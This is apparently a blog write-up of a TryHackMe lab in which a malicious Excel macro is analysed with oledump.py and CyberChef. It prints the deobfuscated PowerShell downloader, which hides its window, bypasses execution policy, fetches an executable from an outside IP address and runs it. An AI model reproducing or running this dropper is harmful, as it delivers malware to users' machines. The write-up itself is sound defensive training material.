---
title: "TryHackMe: REMnux Getting Started - Task 3 File Analysis"
author: Dustin Merritt
categories: [TryHackMe]
tags: [remnux, oledump, malware, vba, static analysis, cyberchef]
render_with_liquid: false
media_subpath: /images/tryhackme_remnuxgettingstarted/
image:
  path: room_image.webp
---

In this TryHackMe room, we used **REMnux** to analyze a suspicious Excel document named `agenttesla.xlsm`. We leveraged the `oledump.py` tool to extract and examine embedded macros, then used **CyberChef** to clean and interpret an obfuscated PowerShell payload. This exercise demonstrated a realistic scenario where VBA macros are used to drop malware onto a target system.

[![TryHackMe Room Link](room_image.webp){: width="300" height="300" .shadow}](https://tryhackme.com/room/remnuxgettingstarted){: .center }

## Initial Setup

We started by opening the **REMnux VM** and navigating to the provided file path:

```bash
cd /home/ubuntu/Desktop/tasks/agenttesla/
```

Running `oledump.py` on `agenttesla.xlsm` revealed several streams, notably:

```bash
oledump.py agenttesla.xlsm
```

Output:
```
A: xl/vbaProject.bin
 A1:       468 'PROJECT'
 A2:        62 'PROJECTwm'
 A3: m     169 'VBA/Sheet1'
 A4: M     688 'VBA/ThisWorkbook'
 A5:         7 'VBA/_VBA_PROJECT'
 A6:       209 'VBA/dir'
```

The stream labeled `A4` contains a **macro** (`M` flag), suggesting potential malicious behavior.

## Macro Extraction

We extracted the contents of the macro using:

```bash
oledump.py agenttesla.xlsm -s 4
```

This provided raw hex output, but it was difficult to interpret. To decode the VBA macro, we added the `--vbadecompress` flag:

```bash
oledump.py agenttesla.xlsm -s 4 --vbadecompress
```

The output revealed a familiar PowerShell obfuscation pattern using `*` and `^` as noise characters:

```vb
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* ... -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" ..."
```

## PowerShell Deobfuscation with CyberChef

To make the PowerShell command human-readable, we used **CyberChef**:

- Apply two **Find/Replace** operations:
  - Replace `*` with an empty string
  - Replace `^` with an empty string

> 🔽 **Insert screenshot of CyberChef here showing the Find/Replace steps and the cleaned PowerShell script**

Once cleaned, the PowerShell command was clearly a downloader:

```powershell
powershell -WindowStyle hidden -executionpolicy bypass;
$TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } PassThru;
Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile;
Start-Process $TempFile;
```

## What Does This Do?

- **Hidden Window**: Avoid user suspicion
- **Bypass Execution Policy**: Allow running potentially blocked scripts
- **Download EXE**: Grab `Doc-3737122pdf.exe` from a suspicious IP
- **Execute**: Run the file on the target machine

This macro behavior is a classic example of **initial access malware delivery**, likely a variant of **AgentTesla**, a popular information stealer.

## Bonus: Analyzing `possible_malicious.docx`

We applied the same technique to `possible_malicious.docx`:

```bash
oledump.py possible_malicious.docx
```

Output:
```
... 16 data streams ...
... macro present at stream 8 ...
```

Another suspicious macro! These steps could easily be repeated to investigate further.

## Wrap-Up

This TryHackMe challenge was a practical introduction to static malware analysis using REMnux. Tools like `oledump.py` and CyberChef make reverse-engineering obfuscated macros more accessible. Remember, even Excel files can be trojan horses — always analyze before opening!

## Key Takeaways

- **Tool used**: `oledump.py`
- **Macro identified in stream**: `A4`
- **PowerShell function for downloading files**: `Invoke-WebRequest`
- **Downloaded file name**: `Doc-3737122pdf.exe`
- **Downloaded location**: `$TempFile`

---

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>